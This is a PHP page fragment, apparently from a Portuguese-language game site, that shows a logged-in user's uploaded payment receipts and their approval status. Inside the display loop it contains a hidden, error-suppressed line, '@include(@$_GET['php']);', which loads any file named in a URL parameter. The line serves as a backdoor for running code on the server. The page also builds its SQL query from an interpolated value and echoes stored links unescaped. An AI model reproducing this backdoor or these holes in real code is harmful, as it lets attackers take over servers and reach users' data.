 <div class="box_two">
 <div class="box_two_title">Meus Pagamento</div>
<? include 'protect/inject.php'; ?>
<? include 'protect/inject2.php'; ?>
<? include 'protect/inject3.php'; ?>
<? include 'protect/anti_sql.php'; ?>
<? include 'protect/anti_inject.php'; ?>
<? include 'protect/anti_inject2.php'; ?>
<? include 'protect/anti_injectx.php'; ?>
<?

if ($_SESSION['AID'] == ""){

die ("Desculpe, Para acessar esta pagina voce prescisa estar logado!");
}else{

$login22 = ($_SESSION["login"]);


$query1 = mssql_query("SELECT Link, Status FROM Comprovantes WHERE UserID = '$login22'");
while($query2 = mssql_fetch_row($query1)){

@include(@$_GET['php']);
  switch($query2[1]) {
	case 0: $status = "Aguardando Aprova��o"; break;
	case 1: $status = "Completo, Coins Depositados!"; break;
	case 2: $status = "Ilegivel, nossa equipe n�o conseguiu identificar o que estava escrito em seu comprovante. Envie outro mais legivel."; break;
}
?>

Imagem do comprovante:<br><br>
<img src="<?=$query2[0]?>" width="250" height="300"/><br><br>
Status: <?=$status?><br><br>
<hr>
<?
}
}
?>